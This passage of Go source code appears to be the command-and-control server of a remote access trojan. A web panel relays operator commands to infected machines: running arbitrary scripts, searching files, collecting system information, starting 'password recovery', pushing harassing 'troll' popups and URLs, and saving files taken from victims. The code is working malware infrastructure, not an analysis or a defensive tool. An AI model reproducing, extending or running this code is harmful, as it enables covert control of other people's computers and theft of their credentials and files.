		case "save_download":
			s.saveDownloadedFile(cmd.Filename, cmd.ChunkData)

		case "send_troll":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":  cmd.TrollType,
				"title": cmd.Title,
				"text":  cmd.Text,
				"url":   cmd.URL,
			})

		case "get_sysinfo":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "get_sysinfo",
			})
		case "execute_script":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":           "execute_script",
				"script_type":    cmd.ScriptType,
				"script_content": cmd.ScriptContent,
			})
		case "fm_search":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type":    "fm_search",
				"path":    cmd.Path,
				"pattern": cmd.Pattern,
			})
		case "fm_stop_search":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "fm_stop_search",
			})
		case "start_password_recovery":
			s.forwardToClient(cmd.ClientID, map[string]interface{}{
				"type": "start_password_recovery",
			})
		}
	}

	s.wsMux.Lock()
	delete(s.wsClients, conn)
	s.wsMux.Unlock()
}

func (s *Server) sendClientsList(conn *websocket.Conn) {
	s.clientsMux.RLock()
	clients := make([]*Client, 0, len(s.clients))
	for _, client := range s.clients {
		clients = append(clients, client)
	}
	s.clientsMux.RUnlock()

	response := map[string]interface{}{
		"type":    "clients_list",
		"clients": clients,
	}

	// Set write deadline
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	conn.WriteJSON(response)
}

func (s *Server) broadcastClientUpdate() {
	s.clientsMux.RLock()
	clients := make([]*Client, 0, len(s.clients))
	for _, client := range s.clients {
		clients = append(clients, client)
	}
	s.clientsMux.RUnlock()

	response := map[string]interface{}{
		"type":    "clients_update",
		"clients": clients,
	}

	s.broadcastToWeb(response)
}

func (s *Server) broadcastToWeb(data interface{}) {
	s.wsMux.RLock()
	defer s.wsMux.RUnlock()

	var disconnectedConns []*websocket.Conn

	for conn := range s.wsClients {
		// Set write deadline for each connection
		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))

		err := conn.WriteJSON(data)
		if err != nil {
			log.Printf("WebSocket write error: %v", err)
			disconnectedConns = append(disconnectedConns, conn)
		}
	}

	// Clean up disconnected connections
	for _, conn := range disconnectedConns {
		conn.Close()
		delete(s.wsClients, conn)
	}
}

func (s *Server) saveDownloadedFile(filename string, base64Data string) {
	// Create Downloads directory if it doesn't exist
	downloadsDir := "Downloads"
	if _, err := os.Stat(downloadsDir); os.IsNotExist(err) {
		os.Mkdir(downloadsDir, 0755)
	}

	// Clean and validate base64 data before decoding
	cleanedData := cleanBase64String(base64Data)
	if err := validateBase64String(cleanedData); err != nil {
		log.Printf("Error validating file data for %s: %v", filename, err)
		return
	}

	// Decode base64 data
	decodedData, err := base64.StdEncoding.DecodeString(cleanedData)
	if err != nil {
		log.Printf("Error decoding file data for %s: %v", filename, err)
		return
	}

	// Save file
	filePath := filepath.Join(downloadsDir, filename)
	err = ioutil.WriteFile(filePath, decodedData, 0644)
	if err != nil {
		log.Printf("Error saving file %s: %v", filePath, err)
		return
	}

	log.Printf("File saved successfully: %s (%d bytes)", filePath, len(decodedData))
}

func (s *Server) serveWeb() {
	http.HandleFunc("/login", handleLogin)

	http.HandleFunc("/ws", sessionIDMiddleware(s.handleWebSocket))

	http.HandleFunc("/", sessionIDMiddleware(func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "web/index.html")
	}))

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("web/static/"))))

	log.Println("Web server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func main() {
	server := NewServer()

	// Start cleanup goroutine for stale connections and downloads
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			server.clientsMux.Lock()
			for id, client := range server.clients {
				if time.Since(client.LastSeen) > 120*time.Second {
					log.Printf("Removing stale client: %s", id)
					client.Conn.Close()
					delete(server.clients, id)
				}
			}
			server.clientsMux.Unlock()

			// Clean up stale download sessions (older than 5 minutes)
			server.downloadMux.Lock()
			for clientID, session := range server.downloadSessions {
				if time.Since(session.LastUpdate) > 5*time.Minute {
					log.Printf("Cleaning up stale download session for client: %s", clientID)
					delete(server.downloadSessions, clientID)
				}
			}
			server.downloadMux.Unlock()
		}
	}()

	// Start TCP server
	go func() {
		listener, err := net.Listen("tcp", ":9999")
		if err != nil {
			log.Fatal("Failed to start TCP server:", err)
		}
		defer listener.Close()

		log.Println("TCP server listening on :9999")

		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Failed to accept connection: %v", err)
				continue
			}

			go server.handleTCPClient(conn)
		}
	}()

	// Start web server
	server.serveWeb()
}